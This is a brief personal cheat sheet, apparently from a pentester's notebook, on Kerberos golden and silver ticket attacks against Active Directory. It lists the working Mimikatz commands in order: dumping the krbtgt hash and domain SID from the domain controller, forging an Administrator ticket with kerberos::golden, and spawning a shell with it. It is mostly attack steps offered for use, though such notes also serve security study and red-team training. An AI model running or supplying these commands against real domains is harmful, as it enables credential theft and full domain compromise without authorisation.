# Golden/Silver Ticket attack

In order to create a golden ticket, we need the KRBTGT = service account that create TGT with KDC  
In order to create a silver ticket, we only need any accessible account that can log into the desired service

# Golden Ticket
## Dump krbtgt hash w/ Mimikatz
Starts mimikatz : 
```cmd
privilege::debug 
```
Ensure to have this output : `[privilege '20' ok]` 

```cmd
lsadump::lsa /inject /name:krbtgt 
```

- This will dump the hash as well as the security identifier needed to create a Golden Ticket. 
- To create a silver ticket you need to change the /name value to the service you want.

The output will be useful for the next step :
![[mimikatz_lsadump.png]]


## Generate the ticket
```cmd
Kerberos::golden /user:Administrator /domain:DOMAIN_NAME /sid:DOMAIN_SID /krbtgt:KRBTGT_NTLM_HASH /id:500
```

- Administrator : The username
- domain : The domain controller name
- SID : the second part of the first line from the output
- krbtgt : the primary NTLM hash
- id : 500 -> idk what is that

## Use the ticket
```cmd 
misc::cmd
```